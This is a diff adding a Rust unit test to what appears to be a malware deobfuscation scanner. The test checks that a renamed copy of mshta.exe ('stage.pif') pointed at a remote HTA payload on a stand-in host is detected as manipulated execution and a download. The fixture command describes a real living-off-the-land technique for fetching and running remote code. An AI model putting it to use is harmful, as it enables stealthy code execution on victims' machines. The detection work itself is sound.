@@ -15295,6 +15295,63 @@ C:\Users\Public\cu.tmp -K curl.cfg
     }
 
     #[test]
+    fn copied_mshta_alias_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\mshta.exe stage.pif".to_string(),
+            src: "c:\\windows\\system32\\mshta.exe".to_string(),
+            dst: "stage.pif".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"stage.pif https://copied-mshta.example/payload.hta"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. } if target == "stage.pif"
+                )
+            }),
+            "copied mshta alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Mshta { cmd }
+                        if cmd == "mshta.exe https://copied-mshta.example/payload.hta"
+                )
+            }),
+            "copied mshta alias did not replay through mshta handler: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: None, .. }
+                        if src == "https://copied-mshta.example/payload.hta"
+                )
+            }),
+            "no structured Download from copied mshta alias: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-mshta.example/payload.hta"
+                )
+            }),
+            "copied mshta URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_style_compact_flags_exe_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
